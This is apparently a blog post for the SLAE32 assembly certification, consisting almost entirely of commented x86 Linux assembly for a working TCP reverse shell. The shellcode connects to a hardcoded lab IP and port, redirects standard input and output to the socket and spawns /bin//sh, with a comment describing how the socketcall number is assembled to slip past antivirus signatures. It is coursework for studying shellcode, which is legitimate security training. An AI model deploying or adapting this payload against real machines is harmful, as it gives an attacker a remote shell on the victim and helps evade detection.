---
layout: post
title: SLAE32 Assignment 2 - reverse shell
excerpt: asm code and comment for my revshell
---
    ; name     : tcprevshell
    ; author     : Sandro "guly" Zaccarini SLAE-1037
    ; purpose    : the program will create a new connection to a given ip/port and present
    ;              a shell to it this code has been written for SLAE32 assignment 2
    ; references : https://syscalls.kernelgrok.com/ , /usr/include/linux/net.h ,
    ;              man socketcall
    ; license    : CC-BY-NC-SA
    ;
    ; high level flow:
    ; socket -> connect -> dup fd -> spawn /bin//sh
    ;
    ; i'll use different function name to keep it more readable. mostly, function are never called and are used just as "anchor for the human eyes"
    
    global _start
    
    section .text
    
    ; dummy function used to break easily on gdb while debugging, just rets without touching anything
    ; i used to place a call trap and recompile, while having a "b trap" on ~/.gdbinit
    trap:
    ret
    
    zero:
    ; zero eax and ebx by xoring against themself
    xor eax,eax
    xor ebx,ebx
    ret
    
    socketcall2eax:
    ; place syscall code for socketcall in eax, which is 0x66, no need to zero because i use mov.
    ; i'm using add to avoid hardcoded 0x66 call, which could be trapped by some AV, when 0x33 is the call acct and looks harmless to me
    mov al,0x33
    add al,0x33
    ret
    
    ; main code starts here
    _start:
    ; start by zeroing eax,ebx. not really needed because registers are clean, but better safe than sorry
    call zero
    
    createsocket:
    ; ----------------------------------------------------------------------------------------
    ; purpose     : create a socket
    ; references  : man socket
    ; description :
    ; socketcall is the syscall used to work with socket. i'm going to use this syscall to create and connect
    ; the very first thing i have to do, is to create the socket itself. by reading references, i see that she needs 3 registers:
    ; eax => syscall id 0x66 for socketcall, that will be the same for every socketcall call of course and that's why i created a function on top
    ; ebx => socket call id, that is 0x1 for socket creation
    ; ecx => pointer to socket args
    ;
    ; man socket shows me that socket's args are:
    ; domain   => AF_INET because i'm creating a inet socket, and is 0x2
    ; type     => tcp is referenced as STREAM, that is 0x1
    ; protocol => unneded here because there is no inner protocol, so i'll use 0x0
    
    ; not, i'm creating ecx because a zeroed eax is perfect for the purpose
    ; arg will be pushed in reverse order with no hardcoded address: 0, 1, 2
    push eax
    inc eax
    push eax
    inc eax
    push eax
    
    ; because socketcall needs a pointer, i'm moving esp address to ecx
    mov ecx,esp
    
    ; prepare eax to hold the socketcall value as discussed before
    call socketcall2eax
    
    ; because ebx is 0, i can just inc to have it to 1 for socketcall to call socket (pun intended :) )
    inc ebx
    
    ; do the call and create socket
    int 0x80
    
    ; because syscall rets to eax, if everything's good, eax will hold socket file descriptor: save it to esi to have it safe for the whole run
    mov esi,eax
    
    connect:
    ; ----------------------------------------------------------------------------------------
    ; purpose     : connect to raddr:rport
    ; references  : man connect , man 7 ip
    ; description :
    ; eax => syscall id 0x66 for socketcall
    ; ebx => connect call id, 0x3 taken from linux/net.h
    ; ecx => pointer to address struct
    ;
    ; man connect shows me that args are:
    ; sockfd  => already saved in esi
    ; address => pointer to ip struct
    ; addrlen => addrlen is 32bit (0x10)
    ;
    ; man 7 ip shows address struct details. arguments are:
    ; family => AF_INET, so 0x2
    ; port   => held by rport from .data
    ; addr   => held by raddr from .data
    
    ; again, better safe than sorry
    call zero
    
    ; push arg in reverse and move the pointer to ecx
    ; prepare stack pointer to addr struct defined in man 7 ip
    ; push raddr, defined in .data
    push raddr
    ; push port to bind to, defined in .data. pushed as word.
    push word rport
    ; push AF_INET value as word again
    push word 0x2
    ; get stack pointer to ecx
    mov ecx,esp
    
    ; push arg, again in reverse order
    ; addrlen is fixed to 16, or 0x10
    push byte 0x10
    ; pointer to addr struct
    push ecx
    ; sockfd, saved before to esi
    push esi
    ; stack pointer to ecx again, to feed bind socketcall
    mov ecx,esp
    
    ; ebx has been zeroed, mov 0x3 to him
    mov bl,0x3
    
    ; same call to have 0x66 to eax and do socketcall
    call socketcall2eax
    
    ; do the call
    int 0x80
    
    dupfd:
    ; ----------------------------------------------------------------------------------------
    ; purpose     : create fd used by /bin//sh
    ; references  : man dup2
    ; description : every shell has three file descriptor: STDIN(0), STDOUT(1), STDERR(2)
    ; this code will create said fd
    ; eax => 0x3f got from kernelgrok website
    ; ebx => clientid
    ; ecx => newfd id, said file descriptor
    ;
    ; i'm going to create them by looping using ecx, to save some instruction. ecx will start at 2, then is dec and fd is created.
    ; as soon as ecx is 0, the loop ends
    
    
    ; i'm using a different method from one i've used for bindshell just to try.
    ; i'll put 0x3 to ecx to start creating STDERR just after dec
    ; ecx is dirty but edx is 0x0, just swap them
    xchg ecx,edx
    mov cl,0x3
    
    ; copy socket fd to ebx to feed clientid
    mov ebx,esi
    
    ; zero eax and start the loop
    xor eax,eax
    dup2:
    ; dup2 call id
    mov al,0x3f
    
    ; dec ecx to have 2,1,0
    dec ecx
    int 0x80
    ; loop until ecx is 0x0, we then have 3 runs: with 2, 1, 0 values
    jnz dup2
    
    spawnshell:
    ; ----------------------------------------------------------------------------------------
    ; purpose     : spawn /bin//sh
    ; references  : man execve
    ; description : put /bin//sh on the stack, aligned to 8 bytes to prevent 0x00 in the shellcode itself
    ; and null terminating it by pushing a zeroed register at first
    ; eax => execve call, 0xB
    ; ebx => pointer to executed string, which will be /bin//sh null terminated
    ; ecx => pointer to args to executed command, that could be 0x0
    ; edx => pointer to environment, which could be 0x0
    ;
    ; i need to push a null byte to terminate the string, easiest way is to zero a reg and push it but i know ecx is 0x0 so i can save one op
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    ; here the stack will looks like a null terminated /bin/sh:
    ; /bin//sh\0\0\0\0\0\0\0\0
    
    ; and place pointer to ebx
    mov ebx,esp
    
    ; envp to edx and ecx
    push ecx
    mov edx,esp
    push ecx
    mov ecx,esp
    
    ; execve syscall here
    mov al,0xB
    
    ; and pop shell
    int 0x80
    
     _end:
    ; neat exit
    xor eax,eax
    mov al,0x1
    int 0x80
    
    section .data
    ; 65533 converted in hex, then little endian
    rport equ 0xFDFF
    ; 172.16.201.162 in hex, then little endian
    ; i'm lucky that i don't have any 0 in my address, else raddr will contain null bytes. i'm going to publish also a 02_revshell_tcp_127.0.0.1.asm to challenge myself a bit
    raddr equ 0xa2c910ac
    
    ; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
